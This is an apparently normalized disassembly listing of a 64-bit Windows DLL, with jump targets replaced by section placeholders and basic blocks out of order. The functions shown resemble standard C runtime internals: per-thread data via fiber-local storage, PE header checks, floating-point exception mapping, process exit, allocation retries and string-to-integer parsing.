sub_1800109d0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2c8
call sub_180011510
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_18000e06c
xor ebx ebx
xor edx edx
call sub_18001091c
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_180010a78
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0xa0 ]
lea rax [ r--data ]
cmp rcx rax
je r-xdata
call sub_18000e06c
mov ecx 0xd
call sub_180016624
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_18000e06c
mov ecx 0xd
call sub_180016524
mov ecx 0xc
call sub_180016624
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ] 0xffffffff
jne r-xdata
mov ecx 0xc
call sub_180016524
mov rcx rbx
call sub_18000e06c
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_18000e47c
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_18000e06c
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_18000e268
nop
sub_180010bb0
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x20
pop rbx
retn
test rbx rbx
jne r-xdata
xor edx edx
call [ FlsSetValue@IAT ]
mov rcx rbx
call sub_180010a78
call [ FlsGetValue@IAT ]
mov ecx [ rw-data ]
mov rbx rax
sub_180010bf0
push rbx
sub rsp 0x20
call sub_18001143c
call sub_180016414
test eax eax
je r-xdata
call sub_1800108f4
xor eax eax
lea rcx [ sub_180010a78 ]
call [ FlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
mov edx 0x2c8
mov ecx 0x1
call sub_180011510
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
xor edx edx
mov rcx rbx
call sub_18001091c
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180010c80
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_180010cb0
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_180010d00
sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_180010c80
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_180010cb0
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_180010d44
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r15 [ r9 + 0x8 ]
mov r12 [ r9 ]
mov rsi [ r9 + 0x38 ]
sub r12 r15
test [ rcx + 0x4 ] 0x66
mov r14 r9
mov rbp rdx
mov r13 rcx
jne r-xdata
mov rdi [ r9 + 0x20 ]
xor ebp ebp
sub rdi r15
cmp [ rsi ] ebp
jbe r-xdata
xor edi edi
mov [ rax - 0x38 ] rcx
mov [ rax - 0x30 ] r8
cmp [ rsi ] edi
jbe r-xdata
mov eax 0x1
lea rbx [ rsi + 0x10 ]
lea rbx [ rsi + 0xc ]
inc ebp
add rbx 0x10
cmp ebp [ rsi ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp r12 rax
jae r-xdata
inc edi
add rbx 0x10
cmp edi [ rsi ]
jae r-xdata
mov eax [ rbx - 0x4 ]
cmp r12 rax
jae r-xdata
mov ecx [ rbx - 0xc ]
cmp r12 rcx
jb r-xdata
cmp rdi rcx
jb r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] 0x0
je r-xdata
cmp rdi rax
jae r-xdata
mov eax [ rbx - 0x8 ]
cmp r12 rax
jb r-xdata
cmp [ rbx ] 0x1
je r-xdata
mov rdx [ rsp + 0x78 ]
add rax r15
mov cl 0x1
mov [ r14 ] rax
mov r8d [ rbx - 0x4 ]
add r8 r15
call r8
mov eax [ rbx ]
cmp rdi rax
je r-xdata
test [ r13 + 0x4 ] 0x20
jne r-xdata
cmp [ r13 ] 0xe06d7363
jne r-xdata
mov eax [ rbx ]
lea rcx [ rsp + 0x30 ]
mov rdx rbp
add rax r15
call rax
test eax eax
js r-xdata
jmp r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx rbp
add rcx r15
call sub_180019700
mov rax [ r14 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ r13 ]
mov [ rsp + 0x28 ] rax
mov rax [ r14 + 0x28 ]
add rdx r15
mov r8 r13
mov rcx rbp
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_180019730
cmp [ r--data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
lea rcx [ r--data ]
call sub_180010d00
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx r13
call [ r--data ]
sub_180010ee8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_1800109d0
xor r11d r11d
mov rbx rax
cmp rax r11
je r-xdata
xor eax eax
mov rcx [ rax + 0xa0 ]
movsxd r8 [ rw-data ]
mov rdx rcx
mov rax r8
shl rax 0x4
add rax rcx
cmp rdx rax
jae r-xdata
mov rax r8
add rdx 0x10
shl rax 0x4
add rax rcx
cmp rdx rax
jb r-xdata
mov rdx r11
cmp [ rdx ] edi
je r-xdata
cmp [ rdx ] edi
je r-xdata
mov r8 [ rdx + 0x8 ]
cmp r8 r11
je r-xdata
cmp rdx r11
je r-xdata
cmp r8 0x5
jne r-xdata
cmp r8 0x1
jne r-xdata
mov [ rdx + 0x8 ] r11
lea eax [ r8 - 0x4 ]
jmp r-xdata
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
mov ecx [ rdx + 0x4 ]
cmp ecx 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rdx + 0x8 ] r11
call r8
movsxd r10 [ rw-data ]
mov ecx [ rw-data ]
add ecx r10d
mov r9 r10
cmp r10d ecx
jge r-xdata
cmp [ rdx ] 0xc000008e
mov edi [ rbx + 0xb0 ]
jne r-xdata
shl r9 0x4
cmp [ rdx ] 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
mov rax [ rbx + 0xa0 ]
inc r10d
add r9 0x10
mov [ r9 + rax - 0x8 ] r11
mov ecx [ rw-data ]
mov eax [ rw-data ]
add ecx eax
cmp r10d ecx
jl r-xdata
cmp [ rdx ] 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r8
mov [ rbx + 0xb0 ] edi
jmp r-xdata
cmp [ rdx ] 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
mov [ rbx + 0xa8 ] rbp
jmp r-xdata
cmp [ rdx ] 0xc000008d
jne r-xdata
mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp [ rdx ] 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp [ rdx ] 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
mov [ rbx + 0xb0 ] 0x8a
sub_180011108
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_180011174
cmp rcx rdx
jae r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_1800111a8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test eax eax
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
sub_1800111e4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ r--data ] 0x0
mov ebx ecx
je r-xdata
call sub_18001945c
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_1800111a8
test eax eax
jne r-xdata
lea rcx [ r--data ]
call sub_180010d00
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rcx [ sub_180018404 ]
call sub_18000dfe4
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
mov ecx ebx
call [ r--data ]
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add rbx 0x8
call rax
xor eax eax
lea rcx [ rw-data ]
call sub_180010d00
test eax eax
je r-xdata
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
sub_180011294
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r12d r8d
mov ebx edx
mov r15d ecx
mov ecx 0x8
call sub_180016624
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
test r12d r12d
jne r-xdata
mov ecx 0x8
call sub_180016524
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180011174
nop
mov rcx [ rw-data ]
call DecodePointer
mov rsi rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov [ rw-data ] 0x1
lea ecx [ r12 + 0x8 ]
call sub_180016524
mov ecx r15d
call sub_180011108
mov ecx r15d
call [ ExitProcess@IAT ]
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180011174
mov rcx [ rw-data ]
call DecodePointer
mov rdi rax
mov [ rsp + 0x20 ] rax
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov r13 rax
mov [ rsp + 0x38 ] rax
cmp rdi rsi
jb r-xdata
call EncodePointer
cmp [ rdi ] rax
jne r-xdata
mov rcx [ rdi ]
call DecodePointer
mov rbx rax
call EncodePointer
mov [ rdi ] rax
call rbx
mov rcx [ rw-data ]
call DecodePointer
mov rbx rax
mov rcx [ rw-data ]
call DecodePointer
cmp r14 rbx
jne r-xdata
jmp r-xdata
mov r14 rbx
mov [ rsp + 0x28 ] rbx
mov rsi rbx
mov [ rsp + 0x30 ] rbx
mov r13 rax
mov [ rsp + 0x38 ] rax
mov rdi rax
mov [ rsp + 0x20 ] rax
cmp r13 rax
je r-xdata
sub rdi 0x8
mov [ rsp + 0x20 ] rdi
cmp rdi rsi
jb r-xdata
jmp r-xdata
sub_18001143c
push rbx
sub rsp 0x20
call EncodePointer
mov rcx rax
mov rbx rax
call sub_1800134d8
mov rcx rbx
call sub_180019c0c
mov rcx rbx
call sub_180010634
mov rcx rbx
call sub_180019c04
mov rcx rbx
call sub_180019a38
mov rcx rbx
call sub_180019798
mov rcx rbx
call sub_18001e110
mov rcx rbx
call sub_18001977c
lea rcx [ sub_180011420 ]
call __imp_EncodePointer
mov [ rw-data ] rax
add rsp 0x20
pop rbx
retn
sub_1800114a4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor edi edi
mov rsi rcx
or ebp 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi ebp
cmp edi ebp
jne r-xdata
mov rcx rsi
call sub_18000e0ac
mov rbx rax
test rax rax
jne r-xdata
sub_180011510
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_180019c4c
mov rbx rax
test rax rax
jne r-xdata
sub_180011594
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_180019cfc
mov rbx rax
test rax rax
jne r-xdata
sub_18001161c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
xor esi esi
mov rdi r8
mov rbp rdx
or r13d 0xffffffff
mov r12 rcx
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rax rbx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r13d
cmp esi r13d
jne r-xdata
mov r8 rdi
mov rdx rbp
mov rcx r12
call sub_180019dd0
mov rbx rax
test rax rax
jne r-xdata
sub_1800116a4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov r14 rdx
mov rdx rcx
lea rcx [ rsp + 0x30 ]
mov r12d r9d
mov r13 r8
call sub_18000d428
xor r15d r15d
cmp r13 r15
je r-xdata
cmp r14 r15
jne r-xdata
mov [ r13 ] r14
cmp r12d r15d
je r-xdata
call sub_180010834
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r15
mov [ rax ] 0x16
call sub_180010764
cmp [ rsp + 0x48 ] r15b
je r-xdata
movzx esi [ r14 ]
mov edi r15d
lea rbx [ r14 + 0x2 ]
mov ebp 0x8
jmp r-xdata
cmp r12d 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
lea r8 [ rsp + 0x30 ]
mov edx ebp
movzx ecx si
call sub_18001a004
cmp eax r15d
jne r-xdata
cmp r12d 0x24
jg r-xdata
mov rbx [ rsp + 0x90 ]
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov si [ rbx ]
add rbx 0x2
mov ebp [ rsp + 0xb0 ]
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or ebp 0x2
jmp r-xdata
cmp r12d r15d
jne r-xdata
mov si [ rbx ]
add rbx 0x2
cmp r12d 0x10
jne r-xdata
movzx ecx si
call sub_180019e6c
cmp eax r15d
je r-xdata
xor edx edx
or eax 0xffffffff
div r12d
mov r15d eax
mov r14d edx
movzx ecx si
call sub_180019e6c
cmp eax r15d
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0xa
jmp r-xdata
cmp eax r12d
jae r-xdata
mov eax 0x41
cmp ax si
ja r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0x10
cmp [ rbx ] 0x58
je r-xdata
mov r14 [ rsp + 0x98 ]
sub rbx 0x2
test bpl 0x8
jne r-xdata
or ebp 0x8
cmp edi r15d
jb r-xdata
lea eax [ rsi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
mov si [ rbx + 0x2 ]
add rbx 0x4
cmp [ rbx ] 0x58
jne r-xdata
mov r12d 0x8
jmp r-xdata
mov esi 0x7fffffff
test bpl 0x4
jne r-xdata
test r13 r13
cmovne rbx r14
xor edi edi
jmp r-xdata
imul edi r12d
add edi eax
jne r-xdata
lea eax [ rsi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_180010834
mov [ rax ] 0x22
test bpl 0x1
je r-xdata
test bpl 0x1
jne r-xdata
test r13 r13
je r-xdata
movzx ecx si
call sub_180019e6c
cmp eax 0xffffffff
jne r-xdata
or ebp 0x4
test r13 r13
jne r-xdata
cmp eax r14d
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
mov al bpl
and al 0x2
neg al
sbb edi edi
neg edi
add edi esi
or edi 0xffffffff
jmp r-xdata
mov eax ebp
and eax 0x2
je r-xdata
test bpl 0x2
je r-xdata
mov [ r13 ] rbx
mov si [ rbx ]
add rbx 0x2
jmp r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
neg edi
cmp edi esi
jbe r-xdata
mov eax edi
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1800118ec
sub rsp 0x38
xor eax eax
mov r9d r8d
mov r8 rdx
mov [ rsp + 0x20 ] eax
mov rdx rcx
cmp [ rw-data ] eax
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_1800116a4
add rsp 0x38
retn
sub_18001191c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov r14 rdx
mov rdx rcx
lea rcx [ rsp + 0x30 ]
mov r12d r9d
mov r13 r8
call sub_18000d428
xor r15d r15d
cmp r13 r15
je r-xdata
cmp r14 r15
jne r-xdata
mov [ r13 ] r14
cmp r12d r15d
je r-xdata
call sub_180010834
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r15
mov [ rax ] 0x16
call sub_180010764
jmp r-xdata
movzx esi [ r14 ]
mov rdi r15
lea rbx [ r14 + 0x2 ]
mov ebp 0x8
jmp r-xdata
cmp r12d 0x2
jl r-xdata
cmp [ rsp + 0x48 ] r15b
je r-xdata
lea r8 [ rsp + 0x30 ]
mov edx ebp
movzx ecx si
call sub_18001a004
cmp eax r15d
jne r-xdata
cmp r12d 0x24
jg r-xdata
xor eax eax
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov si [ rbx ]
add rbx 0x2
mov ebp [ rsp + 0xb0 ]
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or ebp 0x2
jmp r-xdata
cmp r12d r15d
jl r-xdata
mov si [ rbx ]
add rbx 0x2
cmp r13 r15
je r-xdata
cmp r12d 0x1
je r-xdata
mov [ r13 ] r14
cmp r12d 0x24
jg r-xdata
cmp r12d r15d
jne r-xdata
cmp r12d 0x10
jne r-xdata
movzx ecx si
call sub_180019e6c
cmp eax r15d
je r-xdata
movsxd rcx r12d
xor edx edx
or rax 0xffffffffffffffff
div rcx
mov r15 rax
mov r14 rdx
movzx ecx si
call sub_180019e6c
cmp eax r15d
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0xa
jmp r-xdata
cmp r11d r12d
jae r-xdata
mov eax 0x41
cmp ax si
ja r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0x10
cmp [ rbx ] 0x58
je r-xdata
mov r14 [ rsp + 0x98 ]
sub rbx 0x2
test bpl 0x8
jne r-xdata
or ebp 0x8
cmp rdi r15
jb r-xdata
lea eax [ rsi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
mov si [ rbx + 0x2 ]
add rbx 0x4
cmp [ rbx ] 0x58
jne r-xdata
mov r12d 0x8
jmp r-xdata
mov rsi 0x7fffffffffffffff
test bpl 0x4
jne r-xdata
test r13 r13
cmovne rbx r14
xor edi edi
jmp r-xdata
movsxd rcx r12d
imul rcx rdi
mov edi r11d
add rdi rcx
jne r-xdata
lea eax [ rsi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_180010834
mov [ rax ] 0x22
test bpl 0x1
je r-xdata
test bpl 0x1
jne r-xdata
test r13 r13
je r-xdata
movzx ecx si
call sub_180019e6c
mov r11d eax
cmp eax 0xffffffff
jne r-xdata
or ebp 0x4
test r13 r13
jne r-xdata
mov eax r11d
cmp rax r14
jbe r-xdata
lea r11d [ rax - 0x37 ]
sub eax 0x20
mov al bpl
and al 0x2
neg al
sbb rdi rdi
neg rdi
add rdi rsi
or rdi 0xffffffffffffffff
jmp r-xdata
mov eax ebp
and eax 0x2
je r-xdata
test bpl 0x2
je r-xdata
mov [ r13 ] rbx
mov si [ rbx ]
add rbx 0x2
jmp r-xdata
test eax eax
jne r-xdata
mov rcx 0x8000000000000000
cmp rdi rcx
ja r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
neg rdi
cmp rdi rsi
jbe r-xdata
mov rax rdi
jmp r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rbx [ rsp + 0x90 ]
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
sub_180011bb4
sub rsp 0x38
xor eax eax
mov r9d r8d
mov r8 rdx
mov [ rsp + 0x20 ] eax
mov rdx rcx
cmp [ rw-data ] eax
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_18001191c
add rsp 0x38
retn
sub_180011be4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rbp rcx
mov esi 0x101
mov rcx rbx
mov r8 rsi
xor edx edx
call sub_180016870
xor r11d r11d
lea rdi [ rbp + 0x10 ]
lea ecx [ r11 + 0x6 ]
movzx eax r11w
mov [ rbp + 0x4 ] r11d
mov [ rbp + 0x8 ] r11d
mov [ rbp + 0xc ] r11d
[ rdi ]
lea rdi [ rw-data ]
sub rdi rbp
mov al [ rdi + rbx ]
mov [ rbx ] al
inc rbx
sub rsi 0x1
jne r-xdata
lea rcx [ rbp + 0x11d ]
mov edx 0x100
mov al [ rcx + rdi ]
mov [ rcx ] al
inc rcx
sub rdx 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180011c78
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x570 ] rax
mov rsi rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
mov ebx 0x100
test eax eax
je r-xdata
xor edx edx
lea rcx [ rsi + 0x1d ]
xor eax eax
lea rdx [ rsp + 0x70 ]
cmp r8d 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rdx + 0x20 ]
jmp r-xdata
mov [ rdx ] al
inc eax
inc rdx
cmp eax ebx
jb r-xdata
mov al [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rdi [ rsp + 0x56 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rdx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test al al
jne r-xdata
lea r8d [ rdx - 0x61 ]
lea eax [ r8 + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rsp + 0x570 ]
xor rcx rsp
call sub_180017570
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
inc edx
inc rcx
cmp edx ebx
jb r-xdata
movzx edx [ rdi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
mov eax [ rsi + 0xc ]
and [ rsp + 0x38 ] 0x0
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rsi + 0x4 ]
mov r9d ebx
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x370 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_1800178d4
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x170 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d ebx
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_18001a690
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x270 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_18001a690
lea r11 [ rsp + 0x370 ]
lea rcx [ rsi + 0x1d ]
xor edx edx
add rdi 0x2
mov al [ rdi ]
sub edx r8d
mov rax r8
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_180016870
test [ r11 ] 0x2
je r-xdata
or [ rcx ] 0x10
mov al [ rsp + rdx + 0x170 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
